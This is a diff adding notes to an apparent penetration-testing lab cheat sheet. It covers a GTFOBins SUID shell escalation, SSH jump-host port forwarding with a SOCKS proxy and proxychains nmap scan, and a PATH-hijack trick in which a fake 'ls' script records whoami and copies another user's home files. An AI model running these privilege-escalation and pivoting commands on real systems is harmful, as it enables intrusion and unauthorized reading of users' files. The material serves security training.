@@ -147,3 +147,62 @@ find / -type f -perm /6000 -ls 2>/dev/null
 ## Search GTFObins for exploits
 nice /bin/sh -p
 ```
+## Notes
+```
+ssh -MS /tmp/jump student@10.50.27.155
+ssh -S /tmp/jump dum -O forward -L 10020:192.168.28.105:2222
+ssh -MS /tmp/t1 comrade@127.0.0.1 -p 10020
+ssh -S /tmp/t1 dum -O forward -D 9050
+proxychains nmap 192.168.28.27
+ssh -S /tmp/t1 dum -O forward -L 10021:192.168.28.27:22
+ssh comrade@localhost -p 10021
+
+## Find which user is running the command that based on script provided
+## SCRIPT= cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls
+## User has . in the path so commands are run from current directory and may execute command as a script as such with ls would be interpreted as ./ls
+
+vim ls
+whoami >> /var/tmp/output.txt
+cat /home/billybob/* >> /var/tmp/output.txt
+cat output.txt
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
